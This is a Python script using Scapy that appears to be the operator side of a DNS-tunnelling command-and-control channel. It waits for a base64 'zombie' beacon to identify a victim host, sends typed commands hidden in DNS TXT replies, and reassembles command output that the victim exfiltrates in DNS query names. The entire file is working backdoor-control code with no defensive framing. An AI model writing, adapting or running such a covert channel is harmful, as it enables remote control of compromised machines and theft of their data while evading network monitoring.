from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR
import base64
import os
import signal

victim_ip = ""


def send_cmd():
    cmd = input("Insert command: ").strip()
    cmd = base64.b64encode(cmd.encode())

    send_pkt = IP(dst=victim_ip) / UDP(dport=packet[UDP].sport) / DNS(qr=1, qd=packet[DNS].qd,
                                                                      an=DNSRR(rdata=cmd,
                                                                               rrname=packet[DNS].qd.qname,
                                                                               type='TXT'))
    send(send_pkt, verbose=False)

    if base64.b64decode(cmd).decode() == "exit":
        print("Exit received\nExiting...")
        exit(0)


def send_reply(packet):
    reply_pkt = IP(dst=victim_ip) / UDP(dport=packet[UDP].sport) / DNS(qr=1, qd=packet[DNS].qd,
                                                                       an=DNSRR(rrname=packet[DNS].qd.qname,
                                                                                type='TXT'))
    send(reply_pkt, verbose=False)


def signal_handler(sig, frame):
    print(f"\nSIGINT received.\nExiting...")
    exit(0)


if __name__ == '__main__':
    signal.signal(signal.SIGINT, signal_handler)
    packets = sniff(filter="udp port 53", count=1)

    for packet in packets:
        to_decode = packet[DNS].qd.qname.decode().split('.')[0]
        if base64.b64decode(to_decode).decode() == "zombie":
            victim_ip = packet[IP].src
    send_cmd()

    while True:
        packets = sniff(filter=f"udp port 53 and src {victim_ip}", count=1, prn=send_reply)
        amnt_to_receive = 0
        for packet in packets:
            amnt_to_receive = int(packet[DNS].qd.qname.decode().split(".")[0])

        packets = sniff(filter=f"udp port 53 and src {victim_ip}", count=amnt_to_receive, prn=send_reply)
        for packet in packets:
            with open("output.txt", "a") as f:
                to_decode = packet[DNS].qd.qname.decode().split('.')[0]
                f.write(base64.b64decode(to_decode).decode())

        packets = sniff(filter=f"udp port 53 and src {victim_ip}", count=1)
        os.system("cat ./output.txt")
        os.remove("./output.txt")

        send_cmd()


